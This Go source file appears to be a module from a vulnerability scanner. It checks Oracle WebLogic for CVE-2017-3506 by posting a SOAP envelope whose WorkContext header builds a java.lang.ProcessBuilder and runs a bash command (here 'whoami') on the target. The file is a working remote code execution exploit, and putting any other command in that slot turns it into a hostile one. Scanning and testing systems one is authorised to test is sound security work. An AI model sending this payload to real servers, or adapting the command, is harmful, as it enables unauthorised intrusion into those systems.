package weblogic

import (
	"fmt"
	"github.com/veo/vscan/poc"
	"strings"
)

func CVE_2017_3506(url string) bool {
	post_str := `
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <object class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="3">
                <void index="0">
                  <string>/bin/bash</string>
                </void>
                <void index="1">
                  <string>-c</string>
                </void>
				<void index="2">
                  <string>whoami</string>
                </void>
              </array>
              <void method="start"/>
            </object>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
	`
	if body, err := poc.Weblogicrequest(url+"/wls-wsat/CoordinatorPortType", "POST", post_str); err == nil {
		if (strings.Contains(string(body), "<faultstring>java.lang.ProcessBuilder")) || (strings.Contains(string(body), "<faultstring>0")) {
			fmt.Printf("weblogic-exp-sucess|CVE_2017_3506|%s\n", url)
			return true
		}
	}
	return false
}
